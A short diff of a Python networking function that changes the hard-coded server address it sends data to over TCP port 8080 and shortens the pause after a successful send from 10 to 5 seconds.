@@ -35,7 +35,7 @@ def timestamp():
     return int(time.time())
 
 def ConnectToServerSend(data):
-    _host = "45.79.202.234"
+    _host = "cs.csis.work"
     _port = 8080
     if data:
         for i in range(0,3):
@@ -43,7 +43,7 @@ def ConnectToServerSend(data):
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((_host, _port))
                 sock.sendall(data.encode('utf-8'))
-                time.sleep(10)
+                time.sleep(5)
                 return True
                 
             except:
